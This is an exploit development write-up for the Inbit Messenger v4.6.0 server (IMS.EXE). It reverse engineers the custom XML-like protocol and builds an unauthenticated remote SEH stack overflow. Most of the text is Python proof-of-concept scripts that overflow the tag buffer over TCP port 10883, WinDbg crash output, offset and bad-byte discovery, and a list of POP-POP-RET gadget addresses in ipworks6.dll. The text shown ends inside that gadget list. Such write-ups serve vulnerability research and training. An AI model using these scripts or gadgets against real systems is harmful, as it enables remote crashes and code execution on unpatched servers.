# Inbit Messenger v4.6.0

- [Setup](#setup)
- [Server Protocol Reverse Engineering](#server-protocol-reverse-engineering)
- [Check Binary Protections](#check-binary-protections)
- [SEH Overflow](#seh-overflow)
- [Buffer Offsets](#buffer-offsets)
- [Bad Bytes](#bad-bytes)
- [Redirecting SEH Handler Execution](#redirecting-seh-handler-execution)
- [Generating Shellcode](#generating-shellcode)
- [Thread Activation Context Error](#thread-activation-context-error)
- [Unauthenticated Remote SEH Overflow PoC](#unauthenticated-remote-seh-overflow-poc)
- [Testing Other Versions](#testing-other-versions)
- [Enabling DEP](#enabling-dep)
- [Choosing a DEP Bypass Method](#choosing-a-dep-bypass-method)
- [SEH Overflows With DEP](#seh-overflows-with-dep)
- [Finding General Gadgets](#finding-general-gadgets)
- [SEH Stack Pivot](#seh-stack-pivot)
- [Writing VirtualAlloc Placeholder](#writing-virtualalloc-placeholder)
- [Writing lpAddress Placeholder](#writing-lpaddress-placeholder)
- [Writing Return Address Placeholder](#writing-return-address-placeholder)
- [Placeholders Stack Pivot](#placeholders-stack-pivot)
- [Unauthenticated Remote SEH Overflow DEP Bypass PoC](#unauthenticated-remote-seh-overflow-dep-bypass-poc)
- [Finding Another Way](#finding-another-way)
- [Vulnerability Reverse Engineering](#vulnerability-reverse-engineering)
- [Indirect Function Pointer Control](#indirect-function-pointer-control)
- [Calling WinExec](#calling-winexec)
- [Checking Target Version](#checking-target-version)
- [Unauthenticated Remote Command Execution PoC](#unauthenticated-remote-command-execution-poc)

<small><i><a href='https://magnetikonline.github.io/markdown-toc-generate/'>Markdown table of contents generator</a></i></small>

------

## Setup

Test environment for the application in this writeup:

```
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19044 N/A Build 19044
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: x64 Family 6 Model 86 Stepping 3 GenuineIntel ~2100 Mhz
                           [02]: x64 Family 6 Model 86 Stepping 3 GenuineIntel ~2100 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Total Physical Memory:     3,071 MB
Hotfix(s):                 5 Hotfix(s) Installed.
                           [01]: KB5015730
                           [02]: KB5003791
                           [03]: KB5007115
                           [04]: KB5006670
                           [05]: KB5005699
```

This application can be downloaded from [softsea.com](http://www.softsea.com/review/Inbit-Messenger-Basic-Edition.html). If that link is dead, you should be able to find different versions of this binary using the [WayBackMachine](https://web.archive.org):

- [`im240.exe`](https://web.archive.org/web/*/http://www.inbit.com/im240.exe)
- [`im480.exe`](https://web.archive.org/web/*/http://www.inbit.com/im480.exe)
- [`im490.exe`](https://web.archive.org/web/*/http://www.inbit.com/im490.exe)
- [`im140.exe`](https://web.archive.org/web/*/http://www.inbit.com:80/im140.exe)
- [`im310en.exe`](https://web.archive.org/web/*/http://www.inbit.com:80/im310en.exe)

For this writeup, we need [`im460.exe`](./im460.exe) (MD5 `5d8a8cb0eb81e8321e6e87ff2fc60dee`). Running this binary will show the following:

![1](./img/1.png)

Select `Next` and then check the radio button to install the Server:

![2](./img/2.png)

Then just click through the installer to being installation to get to the following screen:

![3](./img/3.png)

Here, select `Setup Client` to go back and install the client:

![4](./img/4.png)

After this installation, you should see the following:

![5](./img/5.png)

Now we can select `Finish` and complete installation. We should have 3 new desktop icons for the application:

![6](./img/6.png)

Opening the `IM Server` application will start the application. If you see the following, allow the connection:

![7](./img/7.png)

Here is the main application window:

![8](./img/8.png)

If we select `Help > About`, we get the following version:

![9](./img/9.png)

## Server Protocol Reverse Engineering

Before blindly reverse engineering the entire server application, we will attempt to capture some network traffic from the client we installed to see how normal communication looks between the server and a client. Open the client application by clicking on the desktop icon:

![10](./img/10.png)

This will open the following window:

![11](./img/11.png)

Clicking on `Server Settings` near the bottom of the window brings up the following window:

![12](./img/12.png)

We are not sure what a `24m Network` is... Check the `Connect to My Coporate Server`:

![13](./img/13.png)

From here, we can select the `Port >>` button:

![14](./img/14.png)

**It seems the default port is 10883**. See what is listening on that port in a Command Prompt window:

![15](./img/15.png)

It seems like `IMS.EXE` is listening on port 10883. Using [WireShark](https://www.wireshark.org/), set up a filter on the **loopback adapter** to catch traffic on TCP port 10883:

```
tcp.port == 10883
```

![17](./img/17.png)

Now configure the client application to connect to `127.0.0.1`:

![16](./img/16.png)

Then attempt to login from the client application with a random username and password:

![18](./img/18.png)

And after we click `Sign In` we capture some traffic:

![19](./img/19.png)

If we right-click on a TCP packet and select `Follow` and `TCP Stream`, we get the following:

![20](./img/20.png)

It seems like the protocol is plain text (praise be) and uses some custom XML-like protocol. The first XML tag seems to be a unique number. With some intuition, we can see that the number in the first tag matches the number of bytes following the tag. Take the following example packet hexdump:

```
00000047  3c 33 32 3e 3c 30 3e 3c  49 4d 3e 3c 49 44 3e 31   <32><0>< IM><ID>1
00000057  33 3c 2f 49 44 3e 3c 61  3e 30 3c 2f 61 3e 3c 2f   3</ID><a >0</a></
00000067  49 4d 3e 00                                        IM>.
```

The `<32>` tag ends at hex offset `0x4A` The packet ends with a NULL terminator at offset `0x6A` The different between these 2 offsets is 32! The other XML tag in this packet seems to always be `<0>`. Not sure what this is yet... Next we get an `<IM>` and `<ID>` tag with multiple sub-tags that are only one letter long. 

At this point, an intuition would be to hope that the application is trying to parse this custom XML format themselves without some opensource library. This can be error prone as there are many edge cases to get right. A simple test would be to send incorrectly formatted "XML" to the application as a rouge client:

```python
import sys, socket

pkt = b"<" + (b"A" * 2000)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))
s.send(pkt)
s.close()
```

Before we send this, we will attach to the `IMS.EXE` process we identified above using [WinDbg](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools) to catch any exceptions we (hopefully) generate:

![21](./img/21.png)

Run the above PoC as follows:

```bash
python3 poc.py <IP> 10883
```

And we get the following exception in WinDbg!

```
(151c.2fc): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000041 ebx=00000624 ecx=00000002 edx=00000001 esi=01d44eb8 edi=761b23a0
eip=00466e3f esp=0014f8b4 ebp=0014fa10 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
IMS+0x66e3f:
00466e3f 88441dcc        mov     byte ptr [ebp+ebx-34h],al  ss:0023:00150000=41
```

This is a good sign that the application parses their custom XML format themselves in an insecure way.  

## Check Binary Protections

Before we continue with analyzing this crash, we need to know what binary protections are in place for this application so we know what we need to possibly bypass in order to make this potential vulnerability exploitable. Using WinDbg, we will load a JavaScript file to script out this check for all loaded modules in the `IMS.EXE` process memory. Load [`checksec.js`](../../tools/windbg/checksec.js) into WinDbg and execute it as follows:

**NOTE:** The path specified below to the script's location is dependent on your machine setup

```
0:000> .scriptproviders
Available Script Providers:
    NatVis (extension '.NatVis')
    JavaScript (extension '.js')
0:000> .scriptload c:\users\user\desktop\checksec.js
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] loading module ...
[+] run module as follows:

dx -g @$checksec()

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
JavaScript script successfully loaded from 'c:\users\user\desktop\checksec.js'
0:000> dx -g @$checksec()
```

Then click on the ASLR column in the displayed table to sort by any modules compiled without ASLR:

![22](./img/22.png)

This table shows that the `IMS.EXE` binary loads some additional DLLs that are compiled without modern exploit protections like ASLR/DEP and SafeSEH. This will make exploitation easier as we move forward. 

## SEH Overflow

Now we will inspect the crash we got. The application tried to do the following:

```assembly
mov byte ptr [ebp+ebx-34h],al
```

However, the target address shown in WinDbg for this write was `0x00150000` and generated an exception. We also notice that we attempted to write `0x41` to that address which is the hex byte representation of our `A` character. Check the thread's stack in WinDbg:

```
0:000> !teb
TEB at 00302000
    ExceptionList:        0014fa04
    StackBase:            00150000
    StackLimit:           0014b000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 00302000
    EnvironmentPointer:   00000000
    ClientId:             0000151c . 000002fc
    RpcHandle:            00000000
    Tls Storage:          0087d9e0
    PEB Address:          00301000
    LastErrorValue:       0
    LastStatusValue:      c00000a3
    Count Owned Locks:    0
    HardErrorMode:        0
```

Now this makes more sense. We overwrote the top of the thread's stack since the `StackBase` is `0x00150000` and the **stack grows down** from higher memory to lower memory (lowest current address being `StackLimit`). This means we definitely overwrote the call stack. Check it in WinDbg:

```
0:000> k
 # ChildEBP RetAddr      
WARNING: Stack unwind information not available. Following frames may be wrong.
00 0014fa10 41414141     IMS+0x66e3f
01 0014fa14 41414141     0x41414141
02 0014fa18 41414141     0x41414141
03 0014fa1c 41414141     0x41414141
04 0014fa20 41414141     0x41414141
05 0014fa24 41414141     0x41414141
06 0014fa28 41414141     0x41414141
07 0014fa2c 41414141     0x41414141
...
```

That is a good sign. Now check if there are any SEH records on the stack that we also have overwritten since the application is x86:

```
0:000> !exchain
0014fa04: 41414141
Invalid exception stack at 41414141
```

This is a very good sign. We have control over the first SEH record in the chain for this thread. We also have a dependable way to generate an exception since we can send a long buffer of characters to force the thread to attempt to overwrite beyond the top of its stack to an address that is not allocated in the `IMS.EXE` process memory. Check what was supposed to be at `0x00150000` on top of the thread's stack:

```
0:000> !address 00150000

Usage:                  Other
Base Address:           00150000
End Address:            00154000
Region Size:            00004000 (  16.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000002          PAGE_READONLY
Type:                   00040000          MEM_MAPPED
Allocation Base:        00150000
Allocation Protect:     00000002          PAGE_READONLY
Additional info:        System Default Activation Context Data

Content source: 1 (target), length: 4000
```

That is interesting. This memory is allocated but is `PAGE_READONLY`, which generates the exception we got. Regardless, the method of trying to overwrite beyond the top of the thread's stack will work to generate an exception. Now we will find out the **minimum** number of bytes we need to send to make sure we overflow the thread's stack. At the time of the exception, we are adding a `EBX` to `EBP` to write our byte value:

```assembly
mov byte ptr [ebp+ebx-34h],al
```

The registers at the time of the exception show the location of our payload on the stack:

```
0:000> r
eax=00000041 ebx=00000624 ecx=00000002 edx=00000001 esi=01d44eb8 edi=761b23a0
eip=00466e3f esp=0014f8b4 ebp=0014fa10 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
IMS+0x66e3f:
00466e3f 88441dcc        mov     byte ptr [ebp+ebx-34h],al  ss:0023:00150000=41
```

It looks like `EBX` is the buffer offset since `EBP` looks like a stack address:

```
0:000> ? ebx
Evaluate expression: 1572 = 00000624
0:000> !address ebp

Usage:                  Stack
Base Address:           0014b000
End Address:            00150000
Region Size:            00005000 (  20.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000004          PAGE_READWRITE
Type:                   00020000          MEM_PRIVATE
Allocation Base:        00050000
Allocation Protect:     00000004          PAGE_READWRITE
More info:              ~0k

Content source: 1 (target), length: 5f0
```

So it seems like the **minimum** number of bytes to send to overflow the thread's stack is 1572 bytes. To ensure the crash, we will send at least 2000 bytes. To understand the vulnerability more, load the `IMS.EXE` executable into [Ghidra](https://ghidra-sre.org/) and jump to the address where we crash at `0x00466e3f`:

![24](./img/24.png)

If we look at the disassembly window, we see the following pseudo-code:

![25](./img/25.png)

If we look at this function, we can abstract the disassembly to the following C code:

```c
void FUN_00466b7d(...) {
  char local_3a;
  char local_39;
  char local_38 [48];
  int iVar5
  
  int iVar1 = recv(socket, &local_3a, 1, 0)
  if (iVar1 > 0) {
    if (local_3a == '\x1f') {
      // not important
    } else {
      if (local_3a == '<') {   
        do {
          while (true) {
            iVar1 = recv(socket, &local_39, 1, 0);
            if (iVar1 != 1) {
              break;
            }
            if (local_39 == '>') {
              // not important
            }
            local_38[iVar5] = local_39;
            iVar5++;
          }
          if (9 < (local_3a - 0x30)) {
            break;
          }
          local_38[iVar5] = local_3a;
          iVar5++;
        } while (iVar5 < 10);
      }
    }
  }
  // not important
}
```

The source code for the target application is failing to verify that the user only sends a maximum number of characters in the XML tag since the XML tag buffer is on the stack. The inner while loop runs forever receiving user input byte-by-byte onto the stack until a `>` byte is encountered. To patch this vulnerability, the application needs to check `iVar5` is within the bounds of the stack buffer before writing user data there. 

## Buffer Offsets

Now we need to know where in our payload the offsets are to the SEH exception record. Modify the PoC to send a unique string of characters using [metasploit](https://www.metasploit.com/):

```python
import sys, socket, subprocess

PAYLOAD_LENGTH = 2000

payload = subprocess.check_output([
  '/opt/metasploit-framework/embedded/bin/ruby',
  '/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb',
  '-l',
  f'{PAYLOAD_LENGTH}']).strip()
print(f'[+] generated payload length is {len(payload)} bytes')

pkt = b"<" + payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))
s.send(pkt)
s.close()
```

Restart the application in WinDbg and send the new PoC as before:

```
(1730.850): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000043 ebx=00000624 ecx=00000002 edx=00000001 esi=03e99e10 edi=761b23a0
eip=00466e3f esp=0014f8b4 ebp=0014fa10 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
IMS+0x66e3f:
00466e3f 88441dcc        mov     byte ptr [ebp+ebx-34h],al  ss:0023:00150000=41
```

Now check the SEH record on the stack:

```
0:000> !exchain
0014fa04: 35624134
Invalid exception stack at 62413362
0:000> dps 0014fa04 L0n2
0014fa04  62413362
0014fa08  35624134
```

Now get these offsets in the payload:

```bash
# EXCEPTION_REGISTRATION_RECORD.Next
/opt/metasploit-framework/embedded/bin/ruby \
  /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb \
  -q 62413362
# [*] Exact match at offset 40

# EXCEPTION_REGISTRATION_RECORD.Handler
/opt/metasploit-framework/embedded/bin/ruby \
  /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb \
  -q 35624134
# [*] Exact match at offset 44
```

As expected the `EXCEPTION_REGISTRATION_RECORD.Handler` value is 4 bytes after the `EXCEPTION_REGISTRATION_RECORD.Next` value:

```
0:000> dt ntdll!_EXCEPTION_REGISTRATION_RECORD 0014fa04  
   +0x000 Next             : 0x62413362 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x35624134     _EXCEPTION_DISPOSITION  +35624134
```

Update the PoC  with the offsets and verify:

```python
import sys, socket

nSEH = b"1111"
SEH  = b"2222"
PAYLOAD_LENGTH = 2000

pkt  = b"<"
pkt += (b"A" * 40)
pkt += nSEH
pkt += SEH
pkt += (b"B" * (PAYLOAD_LENGTH - len(pkt)))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))
s.send(pkt)
s.close()
```

And we control the SEH handler on the stack now:

```
(1258.20): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000042 ebx=00000624 ecx=00000002 edx=00000001 esi=04049e10 edi=761b23a0
eip=00466e3f esp=0014f8b4 ebp=0014fa10 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
IMS+0x66e3f:
00466e3f 88441dcc        mov     byte ptr [ebp+ebx-34h],al  ss:0023:00150000=41
0:000> !exchain
0014fa04: 32323232
Invalid exception stack at 31313131
```

Continuing execution at this point will try to execute our handler:

```
0:000> g
(1258.20): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=32323232 edx=76f65b50 esi=00000000 edi=00000000
eip=32323232 esp=0014f2c0 ebp=0014f2e0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
32323232 ??              ???
```

## Bad Bytes

We need to know what characters should not be in the payload. Since it seems like this is an error in parsing XML, the character `>` is likely bad. In order to ensure we generate an exception, we need to place our bad bytes buffer in the first 1500 bytes of our payload:

```python
import sys, socket

bad_bytes = [bytes([c]) for c in range(0, 256)] 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# BAD BYTES
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
bad_bytes.remove(b'\x3e') # >
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

nSEH = b"1111"
SEH  = b"2222"
PAYLOAD_LENGTH = 2000

pkt  = b"<"
pkt += (b"A" * 40)
pkt += nSEH
pkt += SEH
pkt += b"".join(bad_bytes)
pkt += (b"B" * (PAYLOAD_LENGTH - len(pkt)))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))
s.send(pkt)
s.close()
```

Sending this PoC results in the expected exception:

```
(f04.1e14): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000042 ebx=00000624 ecx=00000002 edx=00000001 esi=041e9e10 edi=761b23a0
eip=00466e3f esp=0014f8b4 ebp=0014fa10 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
IMS+0x66e3f:
00466e3f 88441dcc        mov     byte ptr [ebp+ebx-34h],al  ss:0023:00150000=41
```

Now check the stack:

```
0:000> !exchain
0014fa04: 32323232
Invalid exception stack at 31313131
0:000> db 0014fa04 L0n300
0014fa04  31 31 31 31 32 32 32 32-00 01 02 03 04 05 06 07  11112222........
0014fa14  08 09 0a 0b 0c 0d 0e 0f-10 11 12 13 14 15 16 17  ................
0014fa24  18 19 1a 1b 1c 1d 1e 1f-20 21 22 23 24 25 26 27  ........ !"#$%&'
0014fa34  28 29 2a 2b 2c 2d 2e 2f-30 31 32 33 34 35 36 37  ()*+,-./01234567
0014fa44  38 39 3a 3b 3c 3d 3f 40-41 42 43 44 45 46 47 48  89:;<=?@ABCDEFGH
0014fa54  49 4a 4b 4c 4d 4e 4f 50-51 52 53 54 55 56 57 58  IJKLMNOPQRSTUVWX
0014fa64  59 5a 5b 5c 5d 5e 5f 60-61 62 63 64 65 66 67 68  YZ[\]^_`abcdefgh
0014fa74  69 6a 6b 6c 6d 6e 6f 70-71 72 73 74 75 76 77 78  ijklmnopqrstuvwx
0014fa84  79 7a 7b 7c 7d 7e 7f 80-81 82 83 84 85 86 87 88  yz{|}~..........
0014fa94  89 8a 8b 8c 8d 8e 8f 90-91 92 93 94 95 96 97 98  ................
0014faa4  99 9a 9b 9c 9d 9e 9f a0-a1 a2 a3 a4 a5 a6 a7 a8  ................
0014fab4  a9 aa ab ac ad ae af b0-b1 b2 b3 b4 b5 b6 b7 b8  ................
0014fac4  b9 ba bb bc bd be bf c0-c1 c2 c3 c4 c5 c6 c7 c8  ................
0014fad4  c9 ca cb cc cd ce cf d0-d1 d2 d3 d4 d5 d6 d7 d8  ................
0014fae4  d9 da db dc dd de df e0-e1 e2 e3 e4 e5 e6 e7 e8  ................
0014faf4  e9 ea eb ec ed ee ef f0-f1 f2 f3 f4 f5 f6 f7 f8  ................
0014fb04  f9 fa fb fc fd fe ff 42-42 42 42 42 42 42 42 42  .......BBBBBBBBB
0014fb14  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
0014fb24  42 42 42 42 42 42 42 42-42 42 42 42              BBBBBBBBBBBB
```

Nice! No bad bytes besides the `>` character. Removing this bad byte and trying to send this PoC results in the following different exception:

```
STATUS_STACK_BUFFER_OVERRUN encountered
(12b0.15cc): Break instruction exception - code 80000003 (first chance)
eax=00000000 ebx=00000001 ecx=7541d964 edx=0014f381 esi=00000000 edi=00000000
eip=754ee2e7 esp=0014f4e4 ebp=0014f574 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
KERNELBASE!UnhandledExceptionFilter+0x57:
754ee2e7 cc              int     3
0:000> !exchain
0014f564: KERNELBASE!_except_handler4+0 (75489060)
  CRT scope  0, filter: KERNELBASE!UnhandledExceptionFilter+61 (754ee2f1)
                func:   KERNELBASE!UnhandledExceptionFilter+65 (754ee2f5)
0014fa04: 32323232
Invalid exception stack at 31313131
0:000> db 0014fa04 L0n300
0014fa04  31 31 31 31 32 32 32 32-00 01 02 03 04 05 06 07  11112222........
0014fa14  08 09 0a 0b 0c 0d 0e 0f-10 11 12 13 14 15 16 17  ................
0014fa24  18 19 1a 1b 1c 1d 1e 1f-20 21 22 23 24 25 26 27  ........ !"#$%&'
0014fa34  28 29 2a 2b 2c 2d 2e 2f-30 31 32 33 34 35 36 37  ()*+,-./01234567
0014fa44  38 39 3a 3b 3c 3d 00 00-00 00 00 00 00 00 00 00  89:;<=..........
0014fa54  00 00 00 00 01 00 00 00-09 39 3b 00 80 96 98 00  .........9;.....
0014fa64  24 fa 14 00 a4 fb 14 00-a9 cd 5d 00 01 00 00 00  $.........].....
0014fa74  b0 fb 14 00 9a 76 46 00-b1 63 33 06 10 9e fa 03  .....vF..c3.....
0014fa84  20 63 67 00 00 00 00 00-01 00 00 00 3c 04 00 00   cg.........<...
0014fa94  00 00 00 00 4c fb 14 00-c0 5a b4 75 b8 9e 83 a7  ....L....Z.u....
0014faa4  fe ff ff ff d4 fa 14 00-9c 35 b2 75 02 04 17 00  .........5.u....
0014fab4  63 03 00 00 01 00 00 00-00 00 00 00 01 00 00 00  c...............
0014fac4  63 03 00 00 95 1a b2 75-00 00 00 00 01 00 00 00  c......u........
0014fad4  de 03 13 00 5d ae d6 62-60 58 d5 62 02 04 17 00  ....]..b`X.b....
0014fae4  58 1c db 00 01 00 00 00-00 00 00 00 4c e1 21 d6  X...........L.!.
0014faf4  0c fc 14 00 01 00 00 00-41 ae d6 62 63 03 00 00  ........A..bc...
0014fb04  ce 04 0d 00 01 00 00 00-0c fc 14 00 00 00 00 00  ................
0014fb14  0c fc 14 00 00 00 00 00-ac b2 2f d2 70 fb 14 00  ........../.p...
0014fb24  9a 18 b2 75 01 00 00 00-00 00 00 00              ...u........
```

This shows that the `>` character is a bad byte. However, the `STATUS_STACK_BUFFER_OVERRUN` is a different exception that usually indicates a stack cookie check failure. However, we checked the binary permissions and made sure it was not compiled with [`/GS`](https://learn.microsoft.com/en-us/cpp/build/reference/gs-buffer-security-check?view=msvc-170)? The way that the `checksec.js` script checks if the application was compiled with stack cookies is looking into the [Load Configuration Data Directory for the SecurityCookie field](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#the-load-configuration-structure-image-only). Maybe this application uses a stack cookie implementation that does not use the Load Configuration Directory? Luckily we are getting around this by using an SEH overflow and not trying to overwrite `EIP` directly...

## Redirecting SEH Handler Execution

Now we will use our control over the SEH handler to gain execution after we generate the exception for writing past the bounds of the thread's stack. For SEH, we need something like the following to gain execution:

```
POP R32; POP R32; RET
POPAD; CALL/JMP EBP 
POPAD; CALL/JMP EDX 
POPAD; CALL/JMP EAX
JMP/CALL DWORD PTR [ESP + 0x??]
JMP/CALL DWORD PTR [EBP + 0x??]
```

This is because, at the time the SEH handler is executed, the stack of the SEH handler set up by the Operating System is as follows:

```
(78.1af4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000042 ebx=00000624 ecx=00000002 edx=00000001 esi=040c9e10 edi=761b23a0
eip=00466e3f esp=0014f8b4 ebp=0014fa10 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
IMS+0x66e3f:
00466e3f 88441dcc        mov     byte ptr [ebp+ebx-34h],al  ss:0023:00150000=41
0:000> !exchain
0014fa04: 32323232
Invalid exception stack at 31313131
0:000> dt ntdll!_EXCEPTION_REGISTRATION_RECORD 0014fa04
   +0x000 Next             : 0x31313131 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x32323232     _EXCEPTION_DISPOSITION  +32323232
0:000> g
(78.1af4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=32323232 edx=76f65b50 esi=00000000 edi=00000000
eip=32323232 esp=0014f2c0 ebp=0014f2e0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
32323232 ??              ???
0:000> dps esp L0n15
0014f2c0  76f65b32 ntdll!ExecuteHandler2+0x26
0014f2c4  0014f3c0
0014f2c8  0014fa04
0014f2cc  0014f3dc
0014f2d0  0014f34c
0014f2d4  0014fa04
0014f2d8  76f65b50 ntdll!ExecuteHandler2+0x44
0014f2dc  0014fa04
0014f2e0  0014f3a8
0014f2e4  76f65b04 ntdll!ExecuteHandler+0x24
0014f2e8  0014f3c0
0014f2ec  0014fa04
0014f2f0  0014f3dc
0014f2f4  0014f34c
0014f2f8  32323232
0:000> dps ebp L0n15
0014f2e0  0014f3a8
0014f2e4  76f65b04 ntdll!ExecuteHandler+0x24
0014f2e8  0014f3c0
0014f2ec  0014fa04
0014f2f0  0014f3dc
0014f2f4  0014f34c
0014f2f8  32323232
0014f2fc  0014fa04
0014f300  0014f3c0
0014f304  00000000
0014f308  76f2cd8b ntdll!RtlDispatchException+0x143
0014f30c  0014f3c0
0014f310  0014fa04
0014f314  0014f3dc
0014f318  0014f34c
```

We notice that the SEH hander for this run of the PoC is at `0x0014fa04` on the stack. When attempt to execute the `EXCEPTION_REGISTRATION_RECORD.Handler` value set to `2222` in ASCII that stack of the exception handler has the `0x0014fa04` address at the following offsets from `ESP` and `EBP`:

```
ESP + 0x08
ESP + 0x14
ESP + 0x1C
ESP + 0x2C

EBP + 0x0C
EBP + 0x1C
EBP + 0x30
```

We will redirect execution to the `EXCEPTION_REGISTRATION_RECORD.Next` value in our SEH handler. Before we search for gadgets, we need to select a module to search in:

![22](./img/22.png)

We need to select a module that is not compiled with `SAFESEH` and `ASLR`. SafeSEH would prevent us from using the SEH handler for our execution redirection. Thankfully, Microsoft prefered backwards compatibility over security in this case as any SEH handler address in a module compiled without SafeSEH is not subject to the same security restrictions as modules compiled with this protection. Therefore, we can use any of the following modules:

```
start    end      module name
00400000 006c4000 IMS          
10000000 10055000 IMLib     
26340000 263d2000 ipworks6        
```

When considering which module to use for gadget searching, we will try to avoid relying on the application module directly (`IMS.EXE`). The hope is that the other application DLLs used above are external libraries that will hardly change with each new version of the software. That way, if we use a gadget from the module for our exploit, we can hopefully get a good amount of portability without needing to find a new gadget for each new version of the software. 

For this writeup, we will use `ipworks6.dll`. The reason is that it appears to be some external library. To help illustrate this, if we load the DLL into [CFF Explorer](https://ntcore.com/?tag=cff-explorer), we see the following:

![33](./img/33.png)

The description for the DLL is from some other company called [nSoftware](https://www.nsoftware.com/). This seems to have nothing to do with the [Inbit software company](http://www.inbit.com/aboutus.html) that the `IMS.EXE` application was released from. The hope here is that _Inbit re-used this same external DLL in multiple releases of this software containing **this same vulnerability**_. We do not know if this vulnerability is present in other versions, but it would be nice to just re-use the same gadgets across multiple versions :)

Load the [`seh.js`](../../../tools/windbg/seh.js) WinDbg script to perform the search for gadgets accounting for the bad byte `0x3E`:

**NOTE:** The path specified below to the script's location is dependent on your machine setup

```
0:000> .scriptproviders
Available Script Providers:
    NatVis (extension '.NatVis')
    JavaScript (extension '.js')
0:000> .scriptload c:\users\user\desktop\seh.js
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] loading module ...
[+] run module as follows:

!seh("<module name>","<bad bytes>")

[+] examples:

!seh("libtarget.dll")
!seh("libspp.dll","00,02,0A,0D")

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
JavaScript script successfully loaded from 'c:\users\user\desktop\seh.js'
0:000> !seh("ipworks6.dll","3E")
```

And this returns a nice list of 177 gadgets with the following:

```
0x26341bf6 | POP EAX; POP ESI; RET;
0x2634f765 | POP EAX; POP ESI; RET;
0x26353a92 | POP EAX; POP ESI; RET;
0x26358370 | POP EAX; POP ESI; RET;
0x26362f7c | POP EAX; POP ESI; RET;
0x26363cda | POP EAX; POP ESI; RET;
0x26365599 | POP EAX; POP ESI; RET;
0x26368f6b | POP EAX; POP ESI; RET;
0x2636f099 | POP EAX; POP ESI; RET;
0x2637c907 | POP EAX; POP ESI; RET;
0x26389cfb | POP EAX; POP ESI; RET;
0x263942a9 | POP EAX; POP ESI; RET;
0x2639bd83 | POP EAX; POP ESI; RET;
0x2639f6f5 | POP EAX; POP ESI; RET;
0x263adf19 | POP EAX; POP ESI; RET;
0x26389252 | POP EBX; POP ECX; RET;
0x263a4e88 | POP EBX; POP ECX; RET;
0x26341459 | POP EBX; POP ESI; RET;
0x263560a9 | POP EBX; POP ESI; RET;
0x26380f6b | POP EBX; POP ESI; RET;
0x26382014 | POP EBX; POP ESI; RET;
0x2638b02e | POP EBX; POP ESI; RET;
0x26392838 | POP EBX; POP ESI; RET;
0x26394255 | POP EBX; POP ESI; RET;
0x263676e1 | POP EBX; POP EDI; RET;
0x26399c10 | POP EBX; POP EBP; RET;
0x263ac1da | POP EBX; POP EBP; RET;
0x263ac24d | POP EBX; POP EBP; RET;
0x263ac2b6 | POP EBX; POP EBP; RET;
0x263aca19 | POP EBX; POP EBP; RET;
0x263ad145 | POP EBX; POP EBP; RET;
0x263adae0 | POP EBX; POP EBP; RET;
0x2638110f | POP ECX; POP ECX; RET;
0x263ac7a5 | POP ECX; POP ECX; RET;
0x263ad157 | POP ECX; POP ECX; RET;
0x263ad645 | POP ECX; POP ECX; RET;
0x263ad65f | POP ECX; POP ECX; RET;
